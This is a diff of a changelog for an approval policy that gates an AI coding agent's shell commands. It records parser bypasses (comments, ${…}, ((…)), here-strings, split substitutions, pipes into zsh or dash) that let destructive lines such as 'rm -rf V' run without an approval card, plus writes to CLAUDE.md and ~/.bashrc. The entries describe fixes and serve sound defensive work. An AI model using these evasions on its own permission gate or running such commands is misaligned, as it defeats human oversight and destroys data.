+- `.` and `source` run a body as a script, and so do `sudo -s`, `sudo -i`, `doas -s` and `sudo --shell`, which start a shell that
+  reads it. `sudo` cannot run in the sandbox, so those follow the manual and are not measured.
+- A body handed to a command that only reads it stays text: `sudo tee /etc/x <<EOF`, `cat > f <<EOF`.
+- `make -f - <<EOF` is not closed: `make` runs the recipes of its body, and so do `python3 - <<EOF` and `perl` for theirs. The README
+  lists it with the other lines this policy still does not read.
+
+## 1.42.6 - Ask for a card when a pipe feeds any shell, not only sh and bash, however it is named or wrapped
+
+Third family of the review of 06/11/2026. A pipe into a shell asked about `| sh` and `| bash` only, a pattern over the text of the
+line. Master 1.36.5 asked about `cat <<EOF | zsh` only because it judged every line of the here-document body; 1.36.6 stopped
+judging those lines, so since then the body runs with no card (bash 3.2 and 5.3 run the `rm -rf V` in `cat <<EOF | zsh⏎rm -rf V⏎EOF`).
+
+- The splitter now says which segments are a stage of a pipeline (after `|` or `|&`, not `||`), and a stage that is a shell with
+  no `-c` script asks as `always`. It is read as a command, so a path in front (`/bin/bash`), quotes and backslashes (`"bash"`,
+  `b\ash`), and the runners before the shell (`env bash`, `sudo -E bash -s`, `timeout 5 bash`, `nice -n 5 bash`, `command bash`,
+  `{ bash; }`, `(bash)`) are all seen, for `sh`, `bash`, `zsh`, `dash`, `ksh`, `ash` and `fish`.
+- The pattern over the text stays as the floor and is wider: `|&`, a path in front, and the same seven shells.
+- A shell with a `-c` script runs that script, not the pipe, and the script is judged on its own; `xargs`, `parallel`, `find`,
+  `watch` and `script` hand the pipe to a program as arguments, so `ls | xargs sh -c '…'` stays automatic.
+
+Measured with `decidir()` at `auto`: `cat <<EOF | zsh`, `| dash`, `| /bin/bash` and `| env bash` (each with a body that runs `rm -rf V`)
+were `gate/always` on 1.36.5 and `allow` on 1.42.0; they are `gate/always` again. `| sudo -E bash`, `| nice -n 5 bash`,
+`| timeout 5 bash`, `| env FOO=1 bash`, `| 'sh'`, `| b\ash` and `|& bash` were `allow` on both and ask now. One test holds both sides
+and fails against 1.42.0's `politica.mjs`.
+
+## 1.42.6 - Open no here-document for a << the shell does not read as one, so a comment, a ${…}, a ((…)) or a here-string no longer hides the next line
+
+Second family of the review of 06/11/2026. 1.36.6 made a here-document body text, so every `<<WORD` that the splitter reads as a
+here-document and the shell does not hides the lines after it from every check, while the shell runs them. Master 1.36.5 had no
+here-documents and judged those lines. The splitter did not know a comment (`echo hi # <<EOF`), nor `${x%<<EOF}`, nor
+`(( x=1<<2 ))`, and it read the second `<` of a here-string `<<<` as the start of `<<`. bash 3.2, bash 5.3 and zsh 5.9 run the
+`rm -rf V` on the next line in all of them (measured in a sandbox with `rm` stubbed). The apostrophe in `echo hi # it's here` opened a
+quote that swallowed the next line too; that one was `allow` on master as well.
+
+- A `#` at the start of a word (after a blank, a newline, `;`, `&` or `|`) outside quotes, `${…}` and `((…))` starts a comment, and
+  its text is neither commands nor a here-document. A `#` that is part of a word stays one: `$#`, `${#x}`, `a#b`, `a\ #b`, `"a"#b`,
+  `$(x)#b`, and one after a parenthesis, where a glob group can be followed by it.
+- `${…}` and `((…))` open no here-document and no comment, and a `$(…)` inside a `${…}` still runs and is still judged.
+- `<<<` is a here-string and opens none.
+- A comment inside `$(…)` keeps its parentheses and quotes to itself, so the substitution ends at its last parenthesis, in all four
+  shells measured (`echo $(echo a # ) <<EOF⏎rm -rf V⏎EOF⏎)` runs the `rm`).
+
+Measured with `decidir()` at `auto`: `echo hi # <<EOF⏎rm -rf V⏎EOF`, `echo ${x%<<EOF}⏎…`, `(( x=1<<2 ))⏎…`, `cat <<< x⏎rm -rf V⏎x` and
+the comment inside `$(…)` were `gate/always` on 1.36.5 and `allow` on 1.42.0; they are `gate/always` again. The two comments with a
+quote in them were `allow` on both and are `always` now. One line gets lighter, on purpose: `ls # list; rm -rf V` asked a card on
+1.36.5 and 1.42.0 because the `;` in a comment split the line, and no shell runs that `rm`. One test holds both sides and fails
+against 1.42.0's `politica.mjs`.
+
+## 1.42.6 - Read a command substitution as one word, so the command after an assignment or a flag with spaces in it is judged again
+
+The independent review of 06/11/2026 of 1.36.6 (#200, merged on 07/11 with this still in it) measured that command lines which
+master 1.36.5 sent to an `always` card ran with no card at the `auto` level from 1.36.6 on. They fall in three families; this is
+the first. 1.36.6 keeps `$(…)` whole in the segment, but `tokensDoSegmento()` cut it at its first space: in `X=$(echo a b) rm -rf V`
+the assignment ended at `X=$(echo`, `a` was the command and `rm` its argument, so nothing judged `rm`, and a flag such as
+`-r$(echo f)` was cut the same way, so `rm` read no flag. The shell reads one word in both. bash 3.2, bash 5.3 and zsh 5.9 all run
+`rm -rf V` for these lines (measured in a sandbox with `rm` stubbed).
+
+- A substitution (`$(…)`, backticks, and the spaces of a `${…}`) is part of the word it sits in, inside double quotes too.
+- A flag word the line completes when it runs (`-r$(echo f)`, `-$X`, `--rec$(echo ursive)`) counts as carrying any flag, so `rm`,
+  `chmod -R 777` and `git clean -f` ask.
+- The shell also takes `X+=1` and `X[0]=1` before a command; both were read as the command's name.
+
+Measured with `decidir()` at `auto`: `X=$(echo a b) rm -rf V`, the same with backticks, `A=1 B=$(echo a b) C=$(date) rm -rf V`,
+`X=$((1 + 2)) rm -rf V` and `rm -r$(echo f) V` were `gate/always` on 1.36.5 and `allow` on 1.42.0; they are `gate/always` again.
+`rm -$(echo r)f V`, `X=${y:-a b} rm -rf V` and `X+=1 rm -rf V` were `allow` on both and are `always` now. One test holds both sides
+(these lines ask; ordinary substitutions such as `FOO=$(git rev-parse HEAD) npm test` stay automatic) and fails against 1.42.0's
+`politica.mjs`. The other two families, and the corpus that compares the policy with 1.36.5, follow in this version.
 
 ## 1.42.4 - A Pentest attempt the engine refused as authorization, and the server did not, is recorded as authorization_check
 
@@ -767,6 +1210,10 @@ channel; a run whose engine has not created its files yet answers an empty windo
 
 ## 1.36.6 - Fence the claude-runner's file writes like its reads, so no level writes a secret, an instruction file or outside the project unasked
 
+> **Correction, 1.42.6.** The title says too much. The fence below belongs to the four file-writing tools (`Write`, `Edit`,
+> `MultiEdit`, `NotebookEdit`); a `Bash` command is not a write to this policy, so at `auto` `echo PWNED > CLAUDE.md` and
+> `echo x >> ~/.bashrc` run with no card, as they did on 1.36.5. `claude-runner/README.md` says what is covered and what is not.
+
 At the `edit` and `auto` levels `decidir()` released every `Write`, `Edit`, `MultiEdit` and `NotebookEdit` before it looked at the
 path, so ADR-032's "the fence comes before the shortcut" held for reads only (review of 02/11/2026). Measured end to end with the
 real runner and SDK 0.3.314 at `auto`, every card rejected: on master `.env` and `CLAUDE.md` in the project were written with no
@@ -788,6 +1235,12 @@ link named otherwise that leads to `CLAUDE.md`); run against master's `politica.
 and `claude-runner/README.md` describes the levels as they are now.
 
 ## 1.36.6 - Read the claude-runner's shell commands the way the shell runs them before the auto level lets one through
+
+> **Correction, 1.42.6.** This reading let through lines that 1.36.5 asked about, and its tests could not see it because they
+> only proved the new spellings: a substitution with a space in a word (`X=$(echo a b) rm -rf V`, `rm -r$(echo f) V`), a `<<` the
+> shell does not read as a here-document (after a `#`, inside `${…}` or `((…))`, or the second `<` of a `<<<`), and a pipe into a
+> shell other than `sh` and `bash` (`cat <<EOF | zsh`). The entries of 1.42.6 close them and add the comparison with 1.36.5 that
+> would have caught them.
 
 The 02/11/2026 review measured, with `decidir()` itself, that the `auto` level released commands its destructive, network and
 secret checks were written to catch, because `claude-runner/politica.mjs` read their words differently from the shell. Measured
